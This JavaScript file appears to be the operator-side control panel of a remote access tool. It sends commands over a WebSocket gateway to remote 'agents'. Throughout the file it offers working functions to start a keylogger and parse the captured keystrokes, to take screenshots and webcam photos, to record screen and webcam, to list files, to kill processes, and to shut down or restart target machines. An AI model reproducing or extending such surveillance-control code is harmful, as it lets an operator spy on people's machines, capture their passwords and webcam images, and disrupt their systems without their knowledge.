export function getAgentList() {
    if (!window.gateway) {
        console.warn('[Logic] Gateway not found');
        return;
    }
    window.gateway.refreshAgents();
}

export function authenticate() {
    if (!window.gateway || !window.gateway.ws || window.gateway.ws.readyState !== WebSocket.OPEN) {
        console.warn('[Logic] Gateway not connected');
        return false;
    }
    window.gateway.authenticate();
    return true;
}

/**
 * Set target agent
 * @param {string} agentId - Agent ID or 'ALL'
 */
export function setTarget(agentId) {
    if (!window.gateway) {
        console.warn('[Logic] Gateway not found');
        return false;
    }
    window.gateway.setTarget(agentId);
    if (agentId && agentId !== 'ALL') {
        sessionStorage.setItem('current_agent_id', agentId);
    }
    return true;
}

/**
 * @param {Function} onTargetSet 
 */
export function initAgentTargetFromURL(onTargetSet) {
    const urlParams = new URLSearchParams(window.location.search);
    let agentId = urlParams.get('id');
    
    if (!agentId) {
        agentId = sessionStorage.getItem('current_agent_id');
        if (agentId) {
            const newUrl = new URL(window.location.href);
            newUrl.searchParams.set('id', agentId);
            window.history.replaceState({}, '', newUrl);
        }
    }
    
    if (agentId) {
        const checkAndSetTarget = () => {
            if (window.gateway && window.gateway.isAuthenticated) {
                if (window.gateway.agentsList && window.gateway.agentsList.length > 0) {
                    setTarget(agentId);
                    console.log(`[Logic] Set target to agent: ${agentId}`);
                    if (onTargetSet && typeof onTargetSet === 'function') {
                        onTargetSet();
                    }
                } else {
                    setTimeout(checkAndSetTarget, 200); 
                }
            } else {
                setTimeout(checkAndSetTarget, 200); 
            }
        };
        setTimeout(checkAndSetTarget, 300); 
    } else if (onTargetSet && typeof onTargetSet === 'function') {
        onTargetSet();
    }
}

/**
 * Get application list from gateway
 * @param {boolean} isInitialLoad - If true, use longer timeout for initial page load
 */
export function fetchAppList(isInitialLoad = false) {
    if (!window.gateway) {
        console.warn('[Logic] Gateway not found');
        return null;
    }
    
    if (!window.gateway.ws || window.gateway.ws.readyState !== WebSocket.OPEN) {
        console.warn('[Logic] Gateway not connected');
        return null;
    }
    
    if (!window.gateway.isAuthenticated) {
        console.warn('[Logic] Gateway not authenticated');
        return null;
    }

    console.log('[Logic] Fetching app list from gateway...');
    
    const existingData = window.gateway.getFormattedAppList();
    if (existingData && existingData.length > 0) {
        return Promise.resolve(existingData);
    }
    
    window.gateway.fetchAppList();
    
    return new Promise((resolve) => {
        const initialCacheLength = window.gateway.appListCache?.length || -1;
        let lastCheckedLength = initialCacheLength;
        let hasReceivedResponse = false;
        let attempts = 0;
        let lastFormattedLength = 0;
        const maxAttempts = isInitialLoad ? 200 : 15;
        const pollInterval = 100;
        
        const checkCache = () => {
            attempts++;
            const rawCache = window.gateway.appListCache;
            const currentLength = Array.isArray(rawCache) ? rawCache.length : 0;
            
            const formattedApps = window.gateway.getFormattedAppList();
            const formattedLength = formattedApps ? formattedApps.length : 0;
            
            if (formattedLength > 0 && formattedLength !== lastFormattedLength) {
                console.log(`[Logic] Formatted apps detected: ${formattedLength} apps`);
                lastFormattedLength = formattedLength;
                resolve(formattedApps);
                return true;
            }
            
            const cacheChanged = currentLength !== lastCheckedLength;
            const isArrayWithData = Array.isArray(rawCache) && currentLength > 0;
            
            if (cacheChanged || isArrayWithData) {
                hasReceivedResponse = true;
                lastCheckedLength = currentLength;
                
                const formattedAppsAfterChange = window.gateway.getFormattedAppList();
                if (formattedAppsAfterChange && formattedAppsAfterChange.length > 0) {
                    console.log(`[Logic] Cache updated, found ${formattedAppsAfterChange.length} apps`);
                    resolve(formattedAppsAfterChange);
                    return true;
                }
            } else if (Array.isArray(rawCache) && attempts > 2) {
                hasReceivedResponse = true;
            }
            
            if (hasReceivedResponse || attempts >= maxAttempts) {
                if (formattedApps && formattedApps.length > 0) {
                    resolve(formattedApps);
                } else if (hasReceivedResponse && formattedLength === 0 && attempts > 10) {
                    resolve([]);
                } else if (attempts >= maxAttempts) {
                    const finalCheck = window.gateway.getFormattedAppList();
                    if (finalCheck && finalCheck.length > 0) {
                        resolve(finalCheck);
                    } else if (hasReceivedResponse) {
                        resolve([]);
                    } else {
                        resolve(null);
                    }
                } else {
                    return false;
                }
                return true; 
            }
            return false; 
        };
        
        if (checkCache()) return;
        
        const pollTimer = setInterval(() => {
            if (checkCache()) {
                clearInterval(pollTimer);
            }
        }, pollInterval);
    });
}

/**
 * Start application
 * @param {number} appId - Application ID
 */
export function startApp(appId) {
    if (!window.gateway || !window.gateway.ws || window.gateway.ws.readyState !== WebSocket.OPEN) {
        console.warn('[Logic] Gateway not connected');
        return false;
    }

    if (!window.gateway.isAuthenticated) {
        console.warn('[Logic] Gateway not authenticated');
        return false;
    }

    window.gateway.startApp(appId);
    console.log(`[Logic] Starting app ID: ${appId}`);
    return true;
}

/**
 * Stop app
 * @param {number} appId - App's ID
 */
export function stopApp(appId) {
    if (!window.gateway || !window.gateway.ws || window.gateway.ws.readyState !== WebSocket.OPEN) {
        console.warn('[Logic] Gateway not connected');
        return false;
    }

    if (!window.gateway.isAuthenticated) {
        console.warn('[Logic] Gateway not authenticated');
        return false;
    }

    window.gateway.killApp(appId);
    console.log(`[Logic] Stopping app ID: ${appId}`);
    return true;
}

/**
 * Get process list from gateway
 * @param {boolean} isInitialLoad - If true, use longer timeout for initial page load
 */
export function fetchProcessList(isInitialLoad = false) {
    if (!window.gateway) {
        console.warn('[Logic] Gateway not found');
        return null;
    }
    
    if (!window.gateway.ws || window.gateway.ws.readyState !== WebSocket.OPEN) {
        console.warn('[Logic] Gateway not connected');
        return null;
    }
    
    if (!window.gateway.isAuthenticated) {
        console.warn('[Logic] Gateway not authenticated');
        return null;
    }

    console.log('[Logic] Fetching process list from gateway...');
    
    const existingData = window.gateway.getFormattedProcessList();
    if (existingData && existingData.length > 0) {
        return Promise.resolve(existingData);
    }
    
    window.gateway.fetchProcessList();
    
    return new Promise((resolve) => {
        const initialCacheLength = window.gateway.processListCache?.length || -1;
        let lastCheckedLength = initialCacheLength;
        let hasReceivedResponse = false;
        let attempts = 0;
        let lastFormattedLength = 0;
        const maxAttempts = isInitialLoad ? 200 : 15;
        const pollInterval = 100;
        
        const checkCache = () => {
            attempts++;
            const rawCache = window.gateway.processListCache;
            const currentLength = Array.isArray(rawCache) ? rawCache.length : 0;
            
            const formattedProcs = window.gateway.getFormattedProcessList();
            const formattedLength = formattedProcs ? formattedProcs.length : 0;
            
            if (formattedLength > 0 && formattedLength !== lastFormattedLength) {
                console.log(`[Logic] Formatted processes detected: ${formattedLength} processes`);
                lastFormattedLength = formattedLength;
                resolve(formattedProcs);
                return true;
            }
            
            const cacheChanged = currentLength !== lastCheckedLength;
            const isArrayWithData = Array.isArray(rawCache) && currentLength > 0;
            
            if (cacheChanged || isArrayWithData) {
                hasReceivedResponse = true;
                lastCheckedLength = currentLength;
                
                const formattedProcsAfterChange = window.gateway.getFormattedProcessList();
                if (formattedProcsAfterChange && formattedProcsAfterChange.length > 0) {
                    console.log(`[Logic] Cache updated, found ${formattedProcsAfterChange.length} processes`);
                    resolve(formattedProcsAfterChange);
                    return true;
                }
            } else if (Array.isArray(rawCache) && attempts > 2) {
                hasReceivedResponse = true;
            }
            
            if (hasReceivedResponse || attempts >= maxAttempts) {
                if (formattedProcs && formattedProcs.length > 0) {
                    resolve(formattedProcs);
                } else if (hasReceivedResponse && formattedLength === 0 && attempts > 10) {
                    resolve([]);
                } else if (attempts >= maxAttempts) {
                    const finalCheck = window.gateway.getFormattedProcessList();
                    if (finalCheck && finalCheck.length > 0) {
                        resolve(finalCheck);
                    } else if (hasReceivedResponse) {
                        resolve([]);
                    } else {
                        resolve(null);
                    }
                } else {
                    return false;
                }
                return true; 
            }
            return false; 
        };
        
        if (checkCache()) return;
        
        const pollTimer = setInterval(() => {
            if (checkCache()) {
                clearInterval(pollTimer);
            }
        }, pollInterval);
    });
}

/**
 * Start process
 * @param {number} processId - Process ID (index)
 */
export function startProcess(processId) {
    if (!window.gateway || !window.gateway.ws || window.gateway.ws.readyState !== WebSocket.OPEN) {
        console.warn('[Logic] Gateway not connected');
        return false;
    }

    if (!window.gateway.isAuthenticated) {
        console.warn('[Logic] Gateway not authenticated');
        return false;
    }

    const processIndex = typeof processId === 'number' ? processId : parseInt(processId, 10);
    if (isNaN(processIndex) || processIndex < 0) {
        console.error('[Logic] Invalid process index:', processId);
        return false;
    }

    window.gateway.startProcess(processIndex);
    console.log(`[Logic] Starting process index: ${processIndex}`);
    return true;
}

/**
 * Dừng process
 * @param {number} processId - ID (index) của process
 */
export function killProcess(processId) {
    if (!window.gateway || !window.gateway.ws || window.gateway.ws.readyState !== WebSocket.OPEN) {
        console.warn('[Logic] Gateway not connected');
        return false;
    }

    if (!window.gateway.isAuthenticated) {
        console.warn('[Logic] Gateway not authenticated');
        return false;
    }

    const processIndex = typeof processId === 'number' ? processId : parseInt(processId, 10);
    if (isNaN(processIndex) || processIndex < 0) {
        console.error('[Logic] Invalid process index:', processId);
        return false;
    }

    window.gateway.killProcess(processIndex);
    console.log(`[Logic] Stopping process index: ${processIndex}`);
    return true;
}


/**
 * Capture screen
 */
export function captureScreen() {
    if (!window.gateway) {
        console.error('[Logic] Gateway chưa sẵn sàng');
        return false;
    }
    
    if (!window.CONFIG || !window.CONFIG.CMD) {
        console.error('[Logic] CONFIG not ready');
        return false;
    }

    if (window.gateway.targetId === 'ALL' || !window.gateway.targetId) {
        console.error('[Logic] Chưa chọn agent. Vui lòng chọn một agent trước khi chụp màn hình.');
        alert('Vui lòng chọn một agent trước khi chụp màn hình.');
        return false;
    }

    console.log('[Logic] Sending SCREENSHOT command to agent:', window.gateway.targetId);
    window.gateway.send(window.CONFIG.CMD.SCREENSHOT, "");
    return true;
}

/**
 * Capture webcam
 */
export function captureWebcam() {
    if (!window.gateway) {
        console.error('[Logic] Gateway chưa sẵn sàng');
        return false;
    }
    
    if (!window.CONFIG || !window.CONFIG.CMD) {
        console.error('[Logic] CONFIG not ready');
        return false;
    }

    if (window.gateway.targetId === 'ALL' || !window.gateway.targetId) {
        console.error('[Logic] Chưa chọn agent. Vui lòng chọn một agent trước khi chụp webcam.');
        alert('Vui lòng chọn một agent trước khi chụp webcam.');
        return false;
    }

    console.log('[Logic] Sending CAMSHOT command to agent:', window.gateway.targetId);
    window.gateway.send(window.CONFIG.CMD.CAMSHOT, "");
    return true;
}

/**
 * Record screen
 * @param {number} duration - Recording duration (seconds), max 15
 */
export function recordScreen(duration = 5) {
    if (!window.gateway) {
        console.error('[Logic] Gateway chưa sẵn sàng');
        return false;
    }
    
    if (!window.CONFIG || !window.CONFIG.CMD) {
        console.error('[Logic] CONFIG not ready');
        return false;
    }

    if (window.gateway.targetId === 'ALL' || !window.gateway.targetId) {
        console.error('[Logic] Chưa chọn agent. Vui lòng chọn một agent trước khi quay màn hình.');
        alert('Vui lòng chọn một agent trước khi quay màn hình.');
        return false;
    }

    const finalDuration = Math.min(Math.max(parseInt(duration, 10) || 5, 1), 15);
    console.log('[Logic] Sending SCR_RECORD command with duration:', finalDuration, 'to agent:', window.gateway.targetId);
    window.gateway.send(window.CONFIG.CMD.SCR_RECORD, String(finalDuration));
    return true;
}

/**
 * Record webcam
 * @param {number} duration - max 15s
 */
export function recordWebcam(duration = 5) {
    if (!window.gateway) {
        console.error('[Logic] Gateway chưa sẵn sàng');
        return false;
    }
    
    if (!window.CONFIG || !window.CONFIG.CMD) {
        console.error('[Logic] CONFIG not ready');
        return false;
    }

    if (window.gateway.targetId === 'ALL' || !window.gateway.targetId) {
        console.error('[Logic] Chưa chọn agent. Vui lòng chọn một agent trước khi quay webcam.');
        alert('Vui lòng chọn một agent trước khi quay webcam.');
        return false;
    }

    const finalDuration = Math.min(Math.max(parseInt(duration, 10) || 5, 1), 15);
    console.log('[Logic] Sending CAM_RECORD command with duration:', finalDuration, 'to agent:', window.gateway.targetId);
    window.gateway.send(window.CONFIG.CMD.CAM_RECORD, String(finalDuration));
    return true;
}

/**
 * Start keylogger
 * @param {number} interval - Data send interval (seconds), default 0.1
 */
export function startKeylog(interval = 0.1) {
    if (!window.gateway) {
        console.warn('[Logic] Gateway not found');
        return false;
    }
    
    if (!window.gateway.ws || window.gateway.ws.readyState !== WebSocket.OPEN) {
        console.warn('[Logic] Gateway not connected');
        return false;
    }

    if (!window.gateway.isAuthenticated) {
        console.warn('[Logic] Gateway not authenticated');
        return false;
    }

    if (!window.CONFIG || !window.CONFIG.CMD) {
        console.error('[Logic] CONFIG not ready');
        return false;
    }

    console.log('[Logic] Starting keylogger with interval:', interval);
    window.gateway.send(window.CONFIG.CMD.START_KEYLOG, JSON.stringify({ interval }));
    return true;
}

/**
 * Stop keylogger
 */
export function stopKeylog() {
    if (!window.gateway) {
        console.warn('[Logic] Gateway not found');
        return false;
    }

    if (!window.CONFIG || !window.CONFIG.CMD) {
        console.error('[Logic] CONFIG not ready');
        return false;
    }

    console.log('[Logic] Stopping keylogger');
    window.gateway.send(window.CONFIG.CMD.STOP_KEYLOG, "");
    return true;
}

/**
 * Shutdown agent
 */
export function shutdownAgent() {
    if (!window.gateway) {
        console.warn('[Logic] Gateway not found');
        return false;
    }
    
    if (!window.CONFIG || !window.CONFIG.CMD) {
        console.error('[Logic] CONFIG not ready');
        return false;
    }

    window.gateway.send(window.CONFIG.CMD.SHUTDOWN, "");
    return true;
}

/**
 * Restart agent
 */
export function restartAgent() {
    if (!window.gateway) {
        console.warn('[Logic] Gateway not found');
        return false;
    }
    
    if (!window.CONFIG || !window.CONFIG.CMD) {
        console.error('[Logic] CONFIG not ready');
        return false;
    }

    window.gateway.send(window.CONFIG.CMD.RESTART, "");
    return true;
}

/**
 * Put agent to sleep
 */
export function sleepAgent() {
    if (!window.gateway) {
        console.warn('[Logic] Gateway not found');
        return false;
    }
    
    if (!window.CONFIG || !window.CONFIG.CMD) {
        console.error('[Logic] CONFIG not ready');
        return false;
    }

    if (!window.CONFIG.CMD.SLEEP) {
        console.error('[Logic] SLEEP command not available in CONFIG.CMD');
        console.log('[Logic] Available commands:', Object.keys(window.CONFIG.CMD));
        return false;
    }

    console.log('[Logic] Sending SLEEP command');
    window.gateway.send(window.CONFIG.CMD.SLEEP, "");
    return true;
}

/**
 * List files in directory
 * @param {string} path - Directory path
 */
export function listFiles(path = "") {
    if (!window.gateway) {
        console.warn('[Logic] Gateway not found');
        return false;
    }

    if (path === "") {
        path = "/";
    }

    console.log(`[Logic] Listing files in: ${path}`);
    window.gateway.listFiles(path);
    return true;
}

/**
 * Get agent machine information
 */
export function whoami() {
    if (!window.gateway || !window.CONFIG) {
        console.warn('[Logic] Gateway or CONFIG not found');
        return false;
    }
    window.gateway.send(window.CONFIG.CMD.WHOAMI, "");
    return true;
}

/**
 * Send echo message to agent
 * @param {string} text - Message content
 */
export function echo(text) {
    if (!window.gateway || !window.CONFIG) {
        console.warn('[Logic] Gateway or CONFIG not found');
        return false;
    }
    window.gateway.send(window.CONFIG.CMD.ECHO, text);
    return true;
}


/**
 * Process received keylog data
 * @param {string|string[]} data - Received character string or Array
 * @param {string} senderId - Sender agent ID
 * @returns {Object} - Object containing processed characters
 */
export function processKeylogData(dataString, senderId) {
    if (!dataString) return { chars: [], processed: false };
    
    const chars = [];
    let i = 0;
    while (i < dataString.length) {
        if (dataString[i] === '[') {
            const endIdx = dataString.indexOf(']', i);
            if (endIdx !== -1) {
                chars.push(dataString.substring(i, endIdx + 1));
                i = endIdx + 1;
            } else {
                chars.push(dataString[i]);
                i++;
            }
        } else {
            chars.push(dataString[i]);
            i++;
        }
    }
    
    return {
        chars: chars,
        processed: true,
        senderId: senderId
    };
}

/**
 * Get formatted app list from cache
 */
export function getFormattedAppList() {
    if (!window.gateway) {
        return [];
    }
    return window.gateway.getFormattedAppList() || [];
}

/**
 * Get formatted process list from cache
 */
export function getFormattedProcessList() {
    if (!window.gateway) {
        return [];
    }
    return window.gateway.getFormattedProcessList() || [];
}

/**
 * Check and get app list cache update
 */
export function checkAppListUpdate() {
    if (!window.gateway || !Array.isArray(window.gateway.appListCache)) {
        return null;
    }
    return window.gateway.getFormattedAppList() || [];
}

/**
 * Check and get process list cache update
 */
export function checkProcessListUpdate() {
    if (!window.gateway || !Array.isArray(window.gateway.processListCache)) {
        return null;
    }
    return window.gateway.getFormattedProcessList() || [];
}

export default {
    getAgentList,
    authenticate,
    setTarget,
    initAgentTargetFromURL,
    
    fetchAppList,
    startApp,
    stopApp,
    
    fetchProcessList,
    startProcess,
    killProcess,
    
    captureScreen,
    captureWebcam,
    recordScreen,
    recordWebcam,
    
    startKeylog,
    stopKeylog,

    shutdownAgent,
    restartAgent,
    sleepAgent,

    listFiles,
    
    whoami,
    echo,
    
    processKeylogData,
    getFormattedAppList,
    getFormattedProcessList,
    checkAppListUpdate,
    checkProcessListUpdate,
};
